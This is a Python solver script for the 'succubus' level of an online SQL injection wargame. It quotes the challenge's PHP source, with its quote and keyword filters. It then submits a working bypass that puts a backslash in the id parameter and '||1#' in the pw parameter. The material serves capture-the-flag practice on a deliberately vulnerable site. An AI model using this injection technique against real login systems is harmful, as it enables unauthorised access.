#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Succubus

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/\'/',$_GET[id])) exit("HeHe");
    if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
    $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) solve("succubus");
    """

    url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': '\\'}

    payload = '||1#'
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)

    response = p.my_request()

    if 'Clear!' in response:
        print('\nSuccubus Clear!')


if __name__ == '__main__':
    main()
